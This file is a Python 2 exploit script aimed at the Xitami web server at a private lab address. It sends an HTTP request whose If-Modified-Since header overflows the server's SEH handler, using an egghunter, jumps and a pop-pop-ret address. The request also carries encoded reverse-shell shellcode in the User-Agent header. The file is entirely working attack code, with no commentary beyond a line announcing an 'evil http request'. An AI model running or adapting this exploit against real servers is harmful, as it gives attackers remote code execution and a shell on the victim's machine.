#!/usr/bin/python

import socket
import os
import sys

ip = "192.168.100.120"
port = 80

egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

longJump = "\xE9\x44\xFF\xFF\xFF"
nSEH = "\x74\xF9\x90\x90" # short jump 5 bytes Back
SEH  = "\x52\x37\x42"     # 0x00423752 - ppr - C:\Xitami\xiwin32.exe


crash  = "A" * 20
crash += egghunter
crash += "A" * (183 - len(crash))
crash += longJump
crash += nSEH
crash += SEH

revshell  = "w00tw00t"
revshell += b"\xbe\x28\x55\xf4\xec\xda\xd1\xd9\x74\x24\xf4\x5a"
revshell += b"\x31\xc9\xb1\x52\x31\x72\x12\x03\x72\x12\x83\xea"
revshell += b"\x51\x16\x19\x16\xb1\x54\xe2\xe6\x42\x39\x6a\x03"
revshell += b"\x73\x79\x08\x40\x24\x49\x5a\x04\xc9\x22\x0e\xbc"
revshell += b"\x5a\x46\x87\xb3\xeb\xed\xf1\xfa\xec\x5e\xc1\x9d"
revshell += b"\x6e\x9d\x16\x7d\x4e\x6e\x6b\x7c\x97\x93\x86\x2c"
revshell += b"\x40\xdf\x35\xc0\xe5\x95\x85\x6b\xb5\x38\x8e\x88"
revshell += b"\x0e\x3a\xbf\x1f\x04\x65\x1f\x9e\xc9\x1d\x16\xb8"
revshell += b"\x0e\x1b\xe0\x33\xe4\xd7\xf3\x95\x34\x17\x5f\xd8"
revshell += b"\xf8\xea\xa1\x1d\x3e\x15\xd4\x57\x3c\xa8\xef\xac"
revshell += b"\x3e\x76\x65\x36\x98\xfd\xdd\x92\x18\xd1\xb8\x51"
revshell += b"\x16\x9e\xcf\x3d\x3b\x21\x03\x36\x47\xaa\xa2\x98"
revshell += b"\xc1\xe8\x80\x3c\x89\xab\xa9\x65\x77\x1d\xd5\x75"
revshell += b"\xd8\xc2\x73\xfe\xf5\x17\x0e\x5d\x92\xd4\x23\x5d"
revshell += b"\x62\x73\x33\x2e\x50\xdc\xef\xb8\xd8\x95\x29\x3f"
revshell += b"\x1e\x8c\x8e\xaf\xe1\x2f\xef\xe6\x25\x7b\xbf\x90"
revshell += b"\x8c\x04\x54\x60\x30\xd1\xfb\x30\x9e\x8a\xbb\xe0"
revshell += b"\x5e\x7b\x54\xea\x50\xa4\x44\x15\xbb\xcd\xef\xec"
revshell += b"\x2c\x32\x47\x8a\xd9\xda\x9a\x52\x33\x47\x12\xb4"
revshell += b"\x59\x67\x72\x6f\xf6\x1e\xdf\xfb\x67\xde\xf5\x86"
revshell += b"\xa8\x54\xfa\x77\x66\x9d\x77\x6b\x1f\x6d\xc2\xd1"
revshell += b"\xb6\x72\xf8\x7d\x54\xe0\x67\x7d\x13\x19\x30\x2a"
revshell += b"\x74\xef\x49\xbe\x68\x56\xe0\xdc\x70\x0e\xcb\x64"
revshell += b"\xaf\xf3\xd2\x65\x22\x4f\xf1\x75\xfa\x50\xbd\x21"
revshell += b"\x52\x07\x6b\x9f\x14\xf1\xdd\x49\xcf\xae\xb7\x1d"
revshell += b"\x96\x9c\x07\x5b\x97\xc8\xf1\x83\x26\xa5\x47\xbc"
revshell += b"\x87\x21\x40\xc5\xf5\xd1\xaf\x1c\xbe\xf2\x4d\xb4"
revshell += b"\xcb\x9a\xcb\x5d\x76\xc7\xeb\x88\xb5\xfe\x6f\x38"
revshell += b"\x46\x05\x6f\x49\x43\x41\x37\xa2\x39\xda\xd2\xc4"
revshell += b"\xee\xdb\xf6"


req  = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 Firefox/68.0 " + revshell + " \r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Thu, " + crash + " \r\n"
req += "Cache-Control: max-age=0\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

